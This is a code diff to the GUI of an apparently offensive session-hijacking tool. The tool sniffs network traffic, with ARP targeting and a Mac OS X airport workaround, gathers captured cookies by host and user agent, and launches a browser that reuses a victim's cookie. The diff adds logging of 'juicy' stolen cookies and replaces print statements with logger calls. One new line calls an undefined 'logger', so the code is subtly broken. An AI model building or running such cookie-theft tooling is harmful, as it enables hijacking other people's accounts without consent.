@@ -1,5 +1,5 @@
 #!/usr/bin/python
-# -*- coding: iso-8859-1 -*-
+# -*- coding: utf-8 -*-
 #this bitch is GPL
 import sys, subprocess, urllib, time
 from PyQt4.QtCore import *
@@ -16,6 +16,7 @@ import re
 import os
 import platform
 from MacMonsterCore import MacMonsterCore
+import MonsterLogger
 
 class MonsterGui(QMainWindow):
     def __init__(self):
@@ -39,6 +40,7 @@ class MonsterGui(QMainWindow):
     
     def incoming(self,infos,cookie,ua):
         self.model.addCookie(infos, cookie,ua)
+        MonsterLogger.printJuicyCookie("ua: %s cookie %s host %s" % (ua, cookie, infos[2]))
         self.cookieWidget.expandAll()
     
     def launchAttack(self):
@@ -48,7 +50,6 @@ class MonsterGui(QMainWindow):
         ua = model.data(index)
         cookie = model.data(index.parent())
         host = model.data(index.parent().parent())
-        
         Popen(["python","MonsterBrowser.py","-u",ua,"-c",cookie,host])
         
         #self.Monster.attack(host,cookie,ua)
@@ -69,6 +70,7 @@ class MonsterGui(QMainWindow):
 
         if reply == QMessageBox.Yes:
             self.stopMonitor()
+            MonsterLogger.logger.info("waiting a few seconds for airport to exit...")
             self.Monster.wait()
             event.accept()
         else:
@@ -120,15 +122,15 @@ class MonsterGui(QMainWindow):
             sys.exit(2)
 
         if interface and filename:
-            print "ERROR: You cannot specify a filename AND an interface"
+            MonsterLogger.logger.error("You cannot specify a filename AND an interface")
             self.usage()
             sys.exit(2)
             
         if platform.system() == "Darwin":
             #mac os x
-            print "Mac OS X detected, switching to workaround using airpcap"
+            MonsterLogger.logger.info("Mac OS X detected, switching to workaround using airpcap")
             if channel is None:
-                print "ERROR: Must specify channel on Mac OS X"
+                logger.error("Must specify channel on Mac OS X")
                 sys.exit(2)
             self.Monster = MacMonsterCore(filename, interface, arp_target, channel)    
         else:
